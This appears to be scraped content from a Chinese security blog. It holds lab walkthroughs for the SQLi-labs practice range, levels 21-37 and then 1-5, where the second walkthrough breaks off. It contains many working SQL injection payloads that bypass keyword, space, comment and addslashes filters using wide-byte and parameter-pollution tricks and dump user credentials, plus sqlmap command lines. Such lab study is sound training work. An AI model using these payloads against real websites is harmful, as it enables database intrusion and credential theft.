0,1\u0026#34;; # 但是 id 被如下函数过滤了 $id= preg_replace(\u0026#39;/or/i\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/AND/i\u0026#39;,\u0026#34;\u0026#34;, $id); return $id; 过滤了 or and 的get注入\n测试阶段 '报错 ''不报错 那么就是'闭合\n我们知道可以用--+注释掉后面\n1 ?id=1\u0026#39; order by 1 --+ 语法不正确 发现过滤了 or\n那么我们继续构造，3正常，4报错\n1 2 3 4 ?id=1\u0026#39; oorrder by 1 --+ ?id=1\u0026#39; oorrder by 2 --+ ?id=1\u0026#39; oorrder by 3 --+ ?id=1\u0026#39; oorrder by 4 --+ 爆数据库名 1 http://sqli.pl/Less-25/?id=-1\u0026#39; union select 1,database(),3 --+ 爆破表名 1 ?id=-1\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;,3 --+ information 的or\n1 ?id=-1\u0026#39; union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=\u0026#39;security\u0026#39;),3 --+ 爆破列名\n1 ?id=-1\u0026#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=\u0026#39;users\u0026#39;),3 --+ 爆破出数据 1 ?id=-1\u0026#39; union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,passwoorrd+SEPARATOORR+0x3c62723e) from users) --+ Less-25a 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=$id 与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，这里不再啰嗦。\n1 ?id=-1 union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,passwoorrd+SEPARATOORR+0x3c62723e) from users) --+ Less-26(过滤or、and、/*、注释、空格和斜线) 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id='$id' 简单源码分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 过滤了 or 和 and 大小写 $id= preg_replace(\u0026#39;/or/i\u0026#39;,\u0026#34;\u0026#34;, $id); //strip out OR (non case sensitive) $id= preg_replace(\u0026#39;/and/i\u0026#39;,\u0026#34;\u0026#34;, $id); //Strip out AND (non case sensitive) # 过滤了 /* $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id); //strip out /* # 过滤了 -- 和 # 注释 $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id); //Strip out -- $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id); //Strip out # # 过滤了空格 $id= preg_replace(\u0026#39;/[\\s]/\u0026#39;,\u0026#34;\u0026#34;, $id); //Strip out spaces # 过滤了斜线 $id= preg_replace(\u0026#39;/[\\/\\\\\\\\]/\u0026#39;,\u0026#34;\u0026#34;, $id); //Strip out slashes return $id; 过滤了 or 和 and 可以采用 双写或者 \u0026amp;\u0026amp; || 绕过\n过滤注释 可以使用闭合绕过\n过滤了空格 可以使用如下的符号来替代：\n符号 说明 %09 TAB 键(水平) %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键(垂直) %a0 空格 由于我在windows下无法使用一些特殊的字符代替空格，此处是因为apache的解析的问题。\n直接使用报错注入\n爆库 （在hackbar中输入\u0026amp;\u0026amp;时，需要自行URL编码为%26%26，否则会报错，而输入||不需要）\n1 ?id=1\u0026#39;||updatexml(1,concat(\u0026#39;:\u0026#39;,(select database())),1)%26%26\u0026#39;1\u0026#39;=\u0026#39;1 爆表名 1 ?id=1\u0026#39;||updatexml(1,concat(\u0026#39;:\u0026#39;,(select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1)),1)||\u0026#39;1\u0026#39;=\u0026#39;1 but 好像不行，过滤了空格和or\n绕过\n1 ?id=1\u0026#39;||updatexml(1,concat(\u0026#39;:\u0026#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=\u0026#39;security\u0026#39;))),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破列名 1 ?id=1\u0026#39;||updatexml(1,concat(\u0026#39;:\u0026#39;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=\u0026#39;security\u0026#39;%26%26table_name=\u0026#39;users\u0026#39;))),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆数据 1 2 3 ?id=1\u0026#39;||updatexml(1,concat(\u0026#39;:\u0026#39;,(select(group_concat(username,\u0026#39;:\u0026#39;,passwoorrd))from(users))),1)||\u0026#39;1\u0026#39;=\u0026#39;1 ?id=1\u0026#39;||updatexml(1,concat(\u0026#39;:\u0026#39;,(select(group_concat(username,\u0026#39;:\u0026#39;,passwoorrd))from(users)where(username=\u0026#39;admin\u0026#39;))),1)||\u0026#39;1\u0026#39;=\u0026#39;1 Less-26a 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=('$id') 与 Less-26 相比，只是拼接方式改变了，因为没有输出报错信息，所以不能使用报错注入了，只能被迫抛弃win环境使用docker，直接上payload。\n1 2 3 4 5 6 7 ?id=999\u0026#39;)%a0union%a0select%a01,database(),3||(\u0026#39;1\u0026#39;)=(\u0026#39;1 ?id=999\u0026#39;)%a0union%a0select%a01,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=\u0026#39;security\u0026#39;)),3||(\u0026#39;1\u0026#39;)=(\u0026#39;1 ?id=999\u0026#39;)%a0union%a0select%a01,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=\u0026#39;users\u0026#39;)),3||(\u0026#39;1\u0026#39;)=(\u0026#39;1 ?id=999\u0026#39;)%a0union%a0select%a01,(select(group_concat(username,\u0026#39;:\u0026#39;,passwoorrd))from(users)),3||(\u0026#39;1\u0026#39;)=(\u0026#39;1 Less-27(过滤了很多) 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=('$id') 查看代码，过滤规则又增加了许多：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 过滤了 /* $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id); # 过滤了 - $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id); # 过滤了 # $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id); # 过滤了空格 $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id); # 过滤了 select /m 严格模式 不可以使用双写绕过 $id= preg_replace(\u0026#39;/select/m\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/select/s\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/Select/s\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/SELECT/s\u0026#39;,\u0026#34;\u0026#34;, $id); # 过滤了 union UNION $id= preg_replace(\u0026#39;/union/s\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/Union/s\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/UNION/s\u0026#39;,\u0026#34;\u0026#34;, $id); return $id; PHP语法\n正则表达式\nPHP正则表达式的模式修饰符（官方文档） PHP正则中的i,m,s,x,e\ni 如果设定了此修正符，模式中的字符将同时匹配大小写字母。 m 如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。 s 如果设定了此修正符，模式中的圆点元字符.匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。 x 如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的#以及下一个换行符之间的所有字符，包括两头，也都被忽略。 e 如果设定了此修正符，preg_replace()在替换字符串中对逆向引用作正常的替换。 ? 在./+/*之后表示非贪婪匹配，./+/*限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个?就可以实现非贪婪或最小匹配。 union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。\n1 2 3 4 5 6 7 8 9 10 11 # 大小写混写 unioN unIon seLect ... # 嵌套双写 uunionnion sselectelect ununionion ... 判断注入点 单引号字符型，过滤掉了#,\u0026ndash;,空格等字符\n1 ?id=1\u0026#39;||\u0026#39;1\u0026#39;=\u0026#39;1 成功闭合 判断数据库名 1 2 ?id=999\u0026#39;%0aunIon%0aselEct%0a1,database(),3%0a||\u0026#39;1\u0026#39;=\u0026#39;1 #使用%0a代替空格，unIon、selEct随机大小写绕过，-被过滤了，使用999让其爆出显错位 判断表名 1 ?id=999\u0026#39;%0aunIon%0aselEct%0a1,(selEct(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;security\u0026#39;)),3%0a||\u0026#39;1\u0026#39;=\u0026#39;1 判断列名 1 ?id=999\u0026#39;%0aunIon%0aselEct%0a1,(selEct(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;users\u0026#39;)),3%0a||\u0026#39;1\u0026#39;=\u0026#39;1 得到数据 1 ?id=999\u0026#39;%0aunIon%0aselEct%0a1,(selEct(group_concat(username,\u0026#39;:\u0026#39;,password))from(users)),3%0a||\u0026#39;1\u0026#39;=\u0026#39;1 总结\n1 这里空格%0a代替\n2这里正则表达式是只要你含有 就会一直匹配 双写不能绕过\n3当-1不能用的时候 随便用一个错误的值把显示的位置让出来 给你要的数据\nLess-27a 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=\u0026quot;$id\u0026quot; 和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。\n1 ?id=999\u0026#34;%0aunIon%0aselEct%0a1,(selEct(group_concat(username,\u0026#39;:\u0026#39;,password))from(users)),3%0a||\u0026#34;1\u0026#34;=\u0026#34;1 Less-28 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=('$id') 过滤规则如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 过滤 /* $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id); # 过滤 - # 注释 $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id); # 过滤 空格 + $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);. # 过滤 union select /i 大小写都过滤 $id= preg_replace(\u0026#39;/union\\s+select/i\u0026#39;,\u0026#34;\u0026#34;, $id); return $id; 这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：\n1 ?id=999\u0026#39;)%a0union%a0select%a01,(select(group_concat(username,password%a0SEPARATOR%a00x3c62723e))from(users)),3||(\u0026#39;1\u0026#39;)=(\u0026#39;1 Less-28a 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=('$id') 比 Less-28 还少了几个过滤规则，可以直接使用 Less-28 的payload：\nLess-29 这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。\nindex.php 1 2 3 4 5 6 7 # id = \u0026#39;x\u0026#39; 的拼接方式 $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; if 查询到结果: 输出查询的详细信息 else: print_r(mysql_error()); 从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：\n1 ?id=-1\u0026#39; union select 1,(select(group_concat(username,password+SEPARATOR+0x3c62723e))from(users)),3 --+ 这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：\nlogin.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 # 查询 query 的字符串 $qs = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; # 模拟 tomcat 的查询函数 处理一下 $id1=java_implimentation($qs); $id=$_GET[\u0026#39;id\u0026#39;]; # 再次过滤检测 whitelist($id1); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; if 查询到结果: 输出查询的详细信息 else: print_r(mysql_error()); ?\u0026gt; function java_implimentation($query_string) { $q_s = $query_string; # \u0026amp; 作为分隔符 分割字符串 $qs_array= explode(\u0026#34;\u0026amp;\u0026#34;,$q_s); # 遍历 qs_array 数组 foreach($qs_array as $key =\u0026gt; $value) { $val=substr($value,0,2); # 如果数组前两位是 id 的话 if($val==\u0026#34;id\u0026#34;) { # 截取 $value 的3-30 的字符串 作为 id 的值 $id_value=substr($value,3,30); return $id_value; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; break; } } } function whitelist($input) { # 过滤规则 检测数字 $match = preg_match(\u0026#34;/^\\d+$/\u0026#34;, $input); if 不符合规则： header(\u0026#39;Location: hacked.php\u0026#39;); } 从代码中还是很容易发现问题的，关键问题出在下面的地方：\n1 2 3 $id1=java_implimentation($qs); ... whitelist($id1); whitelist 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 hacked.php，这里是没毛病的。那么问题出在了这里函数$id1=java_implimentation($qs);\n因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 return $id_value，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。\n假设用户输入这样的语句：\n1 index.php?id=1\u0026amp;id=2 Apache PHP 会解析最后一个参数\nTomcat JSP 会解析第一个参数\n知道这个原理的话后面尝试直接注入吧：\n1 login.php?id=2\u0026amp;id=-2\u0026#39; union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+ Less-30 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=\u0026quot;$id\u0026quot; 和 Less-29 相比没有啥本质变化，只是拼接方式不一样。\n1 login.php?id=2\u0026amp;id=-2\u0026#34; union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+ Less-31 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=（\u0026quot;$id\u0026quot;） 和 Less-29 相比没有啥本质变化，只是拼接方式不一样。\n1 login.php?id=2\u0026amp;id=-2\u0026#34;) union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+ Less-32(宽字节注入) 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id='$id' 考察 Bypass addslashes()，关键的防护代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 if(isset($_GET[\u0026#39;id\u0026#39;])) $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); # 在\u0026#39; \u0026#34; \\ 等敏感字符前面添加反斜杠 function check_addslashes($string) { # \\ 转换为 \\\\ $string = preg_replace(\u0026#39;/\u0026#39;. preg_quote(\u0026#39;\\\\\u0026#39;) .\u0026#39;/\u0026#39;, \u0026#34;\\\\\\\\\\\\\u0026#34;, $string); 将 # 将 \u0026#39; 转为\\\u0026#34; $string = preg_replace(\u0026#39;/\\\u0026#39;/i\u0026#39;, \u0026#39;\\\\\\\u0026#39;\u0026#39;, $string); # 将 \u0026#34; 转为\\\u0026#34; $string = preg_replace(\u0026#39;/\\\u0026#34;/\u0026#39;, \u0026#34;\\\\\\\u0026#34;\u0026#34;, $string); return $string; } 宽字节注入原理\nMySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 %aa%5c 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 \\，所以这里想办法干掉反斜杠即可。\n1、%df 吃掉 \\\n具体的原因是 urlencode(\\') = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。\n2、将 \\' 中的 \\ 过滤掉\n例如可以构造 %5c%5c%27 的情况，后面的%5c会被前面的%5c 给注释掉。这也是 bypass 的一种方法。\n本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：\n1 ?id=-1%df\u0026#39; union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+ Less-33 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id='$id' 拼接方式也是一样的，过滤方法细节有点变化，具体如下：\n1 2 3 4 5 function check_addslashes($string) { $string= addslashes($string); return $string; } addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。\n预定义字符 转义后 \\ \\\\ ' \\' \u0026quot; \\\u0026quot; 该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。\n注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞\nLess-34 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username='$uname' 过滤方法依然和 Less-33 一致：\n1 2 $uname = addslashes($uname1); $passwd= addslashes($passwd1); 只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：\n1 uname=admin%df\u0026#39; union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users)#\u0026amp;passwd=admin MySQL 注入天书这里介绍了一个新的方法\n将 utf-8 转换为 utf-16 或 utf-32，例如将 ' 转为 utf-16 为�\n我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：\n1 2 3 4 ➜ ~ echo \\\u0026#39;|iconv -f utf-8 -t utf-16 ��\u0026#39; ➜ ~ echo \\\u0026#39;|iconv -f utf-8 -t utf-32 ��\u0026#39; 首先尝试一个经典的万能密码：\n1 uname=�\u0026#39; or 1#\u0026amp;passwd= 为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：\n1 SELECT username, password FROM users WHERE username=\u0026#39;�\u0026#39; or 1#and password=\u0026#39;$passwd\u0026#39; LIMIT 0,1 or 1 是一个永真的条件，不论 select 选择出的内容是什么。or 1 之后时钟都是 1，下面是控制后台的演示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # where username = \u0026#39;x\u0026#39; or 1 mysql\u0026gt; select * from users where username = \u0026#39;x\u0026#39; or 1; +----+------------+----------+ | id | username | password | +----+------------+----------+ | 1 | Dumb | 0 | | 2 | Angelina | 0 | | 3 | Dummy | 0 | | 4 | secure | 0 | | 5 | stupid | 0 | | 6 | superman | 0 | | 7 | batman | 0 | | 8 | admin | 1234 | | 9 | admin1 | 0 | | 10 | admin2 | 0 | | 11 | admin3 | 0 | | 12 | dhakkan | 0 | | 14 | admin4 | 0 | | 15 | admin\u0026#39;#sec | 123 | +----+------------+----------+ 14 rows in set (0.00 sec) # where username = \u0026#39;x\u0026#39; or 0 mysql\u0026gt; select * from users where username = \u0026#39;x\u0026#39; or 0; Empty set (0.00 sec) # where 1 mysql\u0026gt; select * from users where 1; +----+------------+----------+ | id | username | password | +----+------------+----------+ | 1 | Dumb | 0 | | 2 | Angelina | 0 | | 3 | Dummy | 0 | | 4 | secure | 0 | | 5 | stupid | 0 | | 6 | superman | 0 | | 7 | batman | 0 | | 8 | admin | 1234 | | 9 | admin1 | 0 | | 10 | admin2 | 0 | | 11 | admin3 | 0 | | 12 | dhakkan | 0 | | 14 | admin4 | 0 | | 15 | admin\u0026#39;#sec | 123 | +----+------------+----------+ 14 rows in set (0.00 sec) # where 0 mysql\u0026gt; select * from users where 0; Empty set (0.00 sec) 那么直接尝试一下最基本的联合查询注入看看：\n1 uname=�\u0026#39; and 1=2 union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users)#\u0026amp;passwd= 也是 OK 的\nLess-35 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=$id Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：\n1 2 3 4 5 6 7 $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); function check_addslashes($string) { $string = addslashes($string); return $string; } 但是本关的拼接方式是：\n1 $sql=\u0026#34;SELECT * FROM users WHERE id=$id LIMIT 0,1\u0026#34;; 实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：\n1 ?id=-1 union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+ Less-36(Bypass mysql_real_escape_string) 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id='$id' 主要防护代码：\n1 2 3 4 5 6 7 $id=check_quotes($_GET[\u0026#39;id\u0026#39;]); function check_quotes($string) { $string= mysql_real_escape_string($string); return $string; } 这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：\n危险字符 转义后 \\ \\\\ ' \\' \u0026quot; \\\u0026quot; 这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：\n1 ?id=-1%df\u0026#39; union select 1,2,(select group_concat(username,password SEPARATOR 0x3c62723e) from users) --+ 或者\n1 ?id=-1�\u0026#39; union select 1,2,(select group_concat(username,password SEPARATOR 0x3c62723e) from users) --+ Less-37 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username='$uname' 依然使用了 和 Less-36 的防护方法：\n1 2 $uname = mysql_real_escape_string($uname1); $passwd= mysql_real_escape_string($passwd1); 所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：\n1 uname=admin%df\u0026#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#\u0026amp;passwd=admin 或者：\n1 uname=�\u0026#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#\u0026amp;passwd= ","date":"2020-07-21T13:20:26Z","image":"https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg","permalink":"https://360rce.github.io/p/ojwgoapt/","title":"SQLI labs 靶场笔记之高级注入姿势 21-37 关"},{"content":"常见注入流程 联合查询注入 1 2 3 4 5 6 7 8 ?id=1\u0026#39; ?id=1\u0026#39; order by 3 --+ ?id=1\u0026#39; order by 4 --+ ?id=-1\u0026#39; union select 1,user(),version() --+ ?id=-1\u0026#39; union select 1,database(),version() --+ ?id=-1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+ ?id=-1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ ?id=-1\u0026#39; union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,password+SEPARATOR+0x3c62723e) from users) --+ 报错注入 手动修改 LIMIT 0,1 来进行结果偏移\n1 2 3 4 5 6 7 8 9 ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = \u0026#39;security\u0026#39; limit 0,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = \u0026#39;security\u0026#39; limit 3,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = \u0026#39;security\u0026#39; and table_name = \u0026#39;users\u0026#39;),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)--+ 布尔盲注 数据库第一个字母为 s\n1 2 3 4 5 ?id=1\u0026#39; and left(database(),1)\u0026gt;\u0026#39;r\u0026#39;--+ ?id=1\u0026#39; and left(database(),1)\u0026gt;\u0026#39;s\u0026#39;--+ ?id=1\u0026#39; and left(database(),2)\u0026gt;\u0026#39;sd\u0026#39;--+ ?id=1\u0026#39; and left(database(),2)\u0026gt;\u0026#39;se\u0026#39;--+ ... 延时盲注 数据库第一个字母的 ascii 码为 115，即s\n利用if(条件,0,1)函数，当条件为真，返回0，假则返回1\n1 2 3 4 5 ?id=1\u0026#39; and if(ascii(substr(database(),1,1))\u0026gt;114,1,sleep(5))--+ ?id=1\u0026#39; and if(ascii(substr(database(),1,1))\u0026gt;115,1,sleep(5))--+ ?id=1\u0026#39; and if(ascii(substr(database(),2,1))\u0026gt;100,1,sleep(5))--+ ?id=1\u0026#39; and if(ascii(substr(database(),2,1))\u0026gt;101,1,sleep(5))--+ ... sqlmap 联合查询注入\n1 sqlmap -u \u0026#34;http://sqli.pl/Less-1/?id=1\u0026#34; --dbms=MySQL --random-agent --flush-session --technique=U -v 3 报错注入\n1 sqlmap -u \u0026#34;http://sqli.pl/Less-1/?id=1\u0026#34; --dbms=MySQL --random-agent --flush-session --technique=E -v 3 布尔盲注\n1 sqlmap -u \u0026#34;http://sqli.pl/Less-1/?id=1\u0026#34; --dbms=MySQL --random-agent --flush-session --technique=B -v 3 延时盲注\n1 sqlmap -u \u0026#34;http://sqli.pl/Less-1/?id=1\u0026#34; --dbms=MySQL --random-agent --flush-session --technique=T -v 3 基础挑战 1-20 关 Less-1 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id='$id' 源码简单分析：\n1 2 3 4 5 6 7 8 # 单引号拼接 $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; # 支持联合、报错、布尔盲注、延时盲注 if true: 输出查询内容 else: print_r(mysql_error()); 联合查询注入 1 2 3 4 5 6 7 8 ?id=1\u0026#39; ?id=1\u0026#39; order by 3 --+ ?id=1\u0026#39; order by 4 --+ ?id=-1\u0026#39; union select 1,user(),version() --+ ?id=-1\u0026#39; union select 1,database(),version() --+ ?id=-1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+ ?id=-1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ ?id=-1\u0026#39; union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,password+SEPARATOR+0x3c62723e) from users) --+ Less-2 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=$id 源码简单分析：\n1 $sql=\u0026#34;SELECT * FROM users WHERE id=$id LIMIT 0,1\u0026#34;; 和 Less-1 利用方式一致，只是闭合方式不一样而已\n1 2 3 4 5 6 7 8 ?id=1 ?id=1 order by 3 --+ ?id=1 order by 4 --+ ?id=-1 union select 1,user(),version() --+ ?id=-1 union select 1,database(),version() --+ ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+ ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ ?id=-1 union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,password+SEPARATOR+0x3c62723e) from users) --+ Less-3 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=('$id') 源码简单分析：\n1 $sql=\u0026#34;SELECT * FROM users WHERE id=(\u0026#39;$id\u0026#39;) LIMIT 0,1\u0026#34;; 和 Less-1 利用方式一致，只是闭合方式不一样而已。\n1 2 3 4 5 6 7 8 ?id=1\u0026#39;) ?id=1\u0026#39;) order by 3 --+ ?id=1\u0026#39;) order by 4 --+ ?id=-1\u0026#39;) union select 1,user(),version() --+ ?id=-1\u0026#39;) union select 1,database(),version() --+ ?id=-1\u0026#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+ ?id=-1\u0026#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ ?id=-1\u0026#39;) union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,password+SEPARATOR+0x3c62723e) from users) --+ Less-4 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=(\u0026quot;$id\u0026quot;) 源码简单分析：\n1 2 3 4 5 6 7 8 9 # 先双引号 在括号拼接 $id = \u0026#39;\u0026#34;\u0026#39; . $id . \u0026#39;\u0026#34;\u0026#39;; $sql=\u0026#34;SELECT * FROM users WHERE id=($id) LIMIT 0,1\u0026#34;; # 支持联合、报错、布尔盲注、延时盲注 if true: 输出查询内容 else: print_r(mysql_error()); 1 2 3 4 5 6 7 8 ?id=1\u0026#34;) ?id=1\u0026#34;) order by 3 --+ ?id=1\u0026#34;) order by 4 --+ ?id=-1\u0026#34;) union select 1,user(),version() --+ ?id=-1\u0026#34;) union select 1,database(),version() --+ ?id=-1\u0026#34;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+ ?id=-1\u0026#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ ?id=-1\u0026#34;) union select 1,2,(select group_concat(username,\u0026#39;:\u0026#39;,password+SEPARATOR+0x3c62723e) from users) --+ Less-5 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id='$id' 源码简单分析：\n1 2 3 4 5 6 7 8 # 直接单引号拼接 $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; # 